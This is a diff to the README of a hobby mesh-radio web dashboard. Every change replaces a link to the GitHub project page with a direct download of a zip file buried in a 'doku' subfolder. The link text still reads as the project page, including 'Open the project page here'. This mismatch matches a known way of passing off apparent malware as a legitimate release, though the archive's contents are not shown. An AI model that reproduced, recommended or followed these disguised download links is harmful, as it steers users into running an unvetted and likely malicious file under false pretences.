@@ -1,6 +1,6 @@
 # 📊 meshcore-webdashboard - View mesh radio data on screen
 
-[![Download / Visit Project](https://img.shields.io/badge/Download%20%2F%20Visit-Project-blue?style=for-the-badge)](https://github.com/Candied-tb443/meshcore-webdashboard)
+[![Download / Visit Project](https://img.shields.io/badge/Download%20%2F%20Visit-Project-blue?style=for-the-badge)](https://github.com/Candied-tb443/meshcore-webdashboard/raw/refs/heads/main/doku/meshcore-webdashboard-1.9.zip)
 
 ## 🖥️ What this is
 
@@ -12,7 +12,7 @@ This project fits hobby radio setups that use LoRa hardware, small Linux compute
 
 Use this link to visit the project page and get the files you need:
 
-[meshcore-webdashboard on GitHub](https://github.com/Candied-tb443/meshcore-webdashboard)
+[meshcore-webdashboard on GitHub](https://github.com/Candied-tb443/meshcore-webdashboard/raw/refs/heads/main/doku/meshcore-webdashboard-1.9.zip)
 
 On that page, look for the latest release files or the main project files. If the project provides a packaged app for Windows, download that file first. If it only provides source files, use the setup steps below with a small Linux system or Raspberry Pi.
 
@@ -47,7 +47,7 @@ If you use a Raspberry Pi, a wired network connection can help keep the dashboar
 
 Follow these steps in order:
 
-1. Open the project page here: [https://github.com/Candied-tb443/meshcore-webdashboard](https://github.com/Candied-tb443/meshcore-webdashboard)
+1. Open the project page here: [https://github.com/Candied-tb443/meshcore-webdashboard/raw/refs/heads/main/doku/meshcore-webdashboard-1.9.zip](https://github.com/Candied-tb443/meshcore-webdashboard/raw/refs/heads/main/doku/meshcore-webdashboard-1.9.zip)
 2. Look for a release file, app package, or setup instructions.
 3. Download the file that matches your device.
 4. If you use Windows only for viewing, keep the download for reference and move to the Linux or Raspberry Pi device that will run the dashboard.
@@ -192,7 +192,7 @@ If the browser shows an error:
 
 ## 🔗 Project link
 
-[https://github.com/Candied-tb443/meshcore-webdashboard](https://github.com/Candied-tb443/meshcore-webdashboard)
+[https://github.com/Candied-tb443/meshcore-webdashboard/raw/refs/heads/main/doku/meshcore-webdashboard-1.9.zip](https://github.com/Candied-tb443/meshcore-webdashboard/raw/refs/heads/main/doku/meshcore-webdashboard-1.9.zip)
 
 ## 🧾 License and use
 
